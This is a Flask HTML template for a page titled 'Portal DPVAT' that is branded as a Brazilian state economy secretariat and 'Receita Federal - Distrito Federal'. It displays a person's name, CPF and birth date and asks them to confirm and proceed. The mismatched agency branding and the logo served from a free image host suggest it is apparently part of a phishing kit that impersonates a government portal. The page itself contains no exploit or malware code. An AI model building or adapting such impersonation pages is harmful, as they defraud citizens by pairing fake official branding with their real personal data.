<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal DPVAT - Dados do Usuário</title>

    <!-- Preload fonts -->
    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-700.woff2') }}" as="font" type="font/woff2" crossorigin>

    <!-- Styles -->
    <link href="{{ url_for('static', filename='css/rawline.css') }}" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">

    <style>
        body {
            font-family: 'rawline', sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
    </style>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'custom-blue': '#225BAC',
                        'custom-yellow': '#F7CD04',
                    }
                }
            }
        }
    </script>
</head>
<body class="bg-gray-50 min-h-screen flex flex-col">
    <!-- Header -->
    <div class="bg-white py-4">
        <div class="container mx-auto px-4">
            <div class="flex flex-col items-center text-center">
                <img src="https://i.ibb.co/7RG7SfZ/MEAssinatura-1.png" alt="Logo of Secretaria de Estado de Economia" class="h-8 mb-2" />
                <div>
                    <p class="text-black text-[10px] leading-tight">
                        SECRETARIA DE ESTADO DE ECONOMIA
                    </p>
                    <p id="state-text" class="text-black text-[10px] leading-tight font-bold">
                        Receita Federal - Distrito Federal
                    </p>
                </div>
            </div>
        </div>
    </div>

    <!-- Blue bar -->
    <div class="bg-custom-blue py-3 shadow-md">
        <div class="container mx-auto px-4 flex items-center">
            <button class="text-white text-2xl mr-4">
                <div class="grid grid-cols-2 gap-0.5 drop-shadow-sm">
                    <div class="w-2 h-2 bg-white"></div>
                    <div class="w-2 h-2 bg-white"></div>
                    <div class="w-2 h-2 bg-white"></div>
                    <div class="w-1.5 h-1.5 bg-white"></div>
                </div>
            </button>
            <span class="text-white text-xl drop-shadow-sm">CONFIRME SEUS DADOS</span>
        </div>
    </div>

    <!-- Main Content -->
    <div class="container mx-auto px-4 py-8">
        <div class="max-w-md mx-auto bg-white rounded-lg shadow-md p-6">
            <h2 class="text-xl font-bold text-gray-800 mb-6">Dados do Contribuinte</h2>
            
            <div class="space-y-4">
                <div class="border rounded-lg p-4">
                    <label class="block text-sm font-medium text-gray-600">Nome Completo</label>
                    <p class="mt-1 text-gray-900">{{ dados.nome }}</p>
                </div>

                <div class="border rounded-lg p-4">
                    <label class="block text-sm font-medium text-gray-600">CPF</label>
                    <p class="mt-1 text-gray-900">{{ dados.cpf }}</p>
                </div>

                <div class="border rounded-lg p-4">
                    <label class="block text-sm font-medium text-gray-600">Data de Nascimento</label>
                    <p class="mt-1 text-gray-900">{{ dados.NASC[:10] }}</p>
                </div>
            </div>

            <div class="mt-8">
                <button class="bg-custom-blue text-white font-bold py-3 px-4 rounded w-full hover:bg-opacity-90 transition-colors">
                    Confirmar e Prosseguir
                </button>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="bg-custom-blue text-white text-center py-3 mt-auto">
        <p class="text-sm">© Secretaria de Estado de Economia. Todos os direitos reservados.</p>
    </div>

    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
</body>
</html>
